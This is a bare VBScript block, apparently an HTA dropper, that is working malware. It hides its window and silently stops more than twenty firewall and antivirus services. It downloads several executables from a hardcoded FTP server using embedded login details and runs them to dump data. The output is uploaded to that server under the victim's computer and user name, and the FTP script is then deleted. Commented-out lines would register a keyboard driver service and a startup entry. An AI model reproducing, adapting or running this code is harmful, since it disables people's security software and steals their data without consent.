   <script language="vbs">
   self.MoveTo 5000,5000
   public fso, aaa
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set WshShell = CreateObject("WScript.Shell")
   function doo (xx)
   aaa= WshShell.Run("cmd /c " & xx, 0, True)
   end function
   doo ("net stop "&chr(34)&"Kerio Personal Firewall"&chr(34))
   doo ("net  stop "&chr(34)&"FW Configuration Interpreter"&chr(34)&" /y")
   doo ("net stop "&chr(34)&"TrueVector Internet Monitor"&chr(34))
   doo ("net stop "&chr(34)&"Norton AntiVirus Auto Protect Service"&chr(34))
   doo ("net stop "&chr(34)&"Symantec Event Manager"&chr(34))
   doo ("net stop "&chr(34)&"avsync manager"&chr(34))
   doo ( "net stop "&chr(34)&"NaV alert"&chr(34))
   doo ("net stop "&chr(34)&"nav auto-protect"&chr(34))
   doo ("net stop "&chr(34)&"norton program scheduler"&chr(34))
   doo ("net stop defwatch")
   doo ("net stop "&chr(34)&"Norton AntiVirus Client"&chr(34))
   doo ("net stop "&chr(34)&"AVG6 Service"&chr(34))
   doo ("net stop "&chr(34)&"Trend NT Realtime Service"&chr(34))
   doo ("net stop "&chr(34)&"AVSync Manager"&chr(34))
   doo ("net stop McShield")
   doo ("net stop "&chr(34)&"McAfee.com McShield"&chr(34))
   doo ("net stop "&chr(34)&"Symantec AntiVirus Client"&chr(34))
   doo ("net stop "&chr(34)&"McAfee.com VirusScan Online Realtime Engine"&chr(34))
   doo ("net stop "&chr(34)&"PC-cillin PersonalFirewall"&chr(34))
   doo ("net stop "&chr(34)&"Sophos Anti-Virus"&chr(34))
   doo ("net stop "&chr(34)&"Sweep for Windows NT Update"&chr(34))
   doo ("net stop "&chr(34)&"Sweep for Windows NT Network"&chr(34))
   doo ("echo open ftp.seacaltd.com >a")
   doo ("echo office@seacaltd.com>>a")
   doo ("echo englez>>a")
   doo ("echo bin>>a" )
   doo ("echo cd web/cur>>a" )
   doo ("echo get m.exe>>a" )
   doo ("echo get mp.exe>>a" )
   doo ("echo get dp.exe>>a" )
   'doo ("echo get winstart.vbs>>a" )
   doo ("echo get winupdate.exe>>a" )
   'doo ("echo get nts.sys>>a")
   doo ("echo get hservice.exe>>a" )
   doo ("echo bye>>a" )
   doo ("ftp -s:a")
   doo ("m /shtml syscom1a1" )
   doo ("mp /shtml 2ver83re" )
   doo ("dp /shtml yt45wax5" )
   'doo ("move nts.sys drivers\")
   aaa = WshShell.Run("winupdate.exe", 0, False)
   Set WshNetwork = CreateObject("WScript.Network")
   nu = WshNetwork.ComputerName & "_" & WshNetwork.UserName
   nu=replace (nu," ","_")
   'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\ErrorControl",1 , "REG_DWORD"
   'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\Type", 1 ,"REG_DWORD"
   'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\Start" , 1 ,"REG_DWORD"
   'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\Group", "Keyboard Class" ,"REG_SZ"
   'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\DispayName", "UsbKey" ,"REG_SZ"
   'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\LogName","\SystemRoot\NTs.dat","REG_SZ"
   'WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\script stop","winstart.vbs","REG_SZ"
   While Not (fso.FileExists("syscom1a1"))Or Not (fso.FileExists("2ver83re"))Or Not(fso.FileExists("yt45wax5"))
   wend
   nu = Chr(34)&nu&"_"&minute(now)&second(now)&".cur"&chr(34)
   doo ("type syscom1a1>"&nu)
   doo ("type 2ver83re>>"&nu)
   doo ("type yt45wax5>>"&nu)
   doo ("echo open ftp.seacaltd.com >a")
   doo ("echo office@seacaltd.com>>a")
   doo ("echo englez>>a")
   doo ("echo bin>>a" )
   doo ("echo cd web>>a" )
   doo ("echo put "&nu& ">>a")
   doo ("echo bye>>a" )
   doo ("ftp -s:a")
   doo ("del a")
   self.close
   </script>
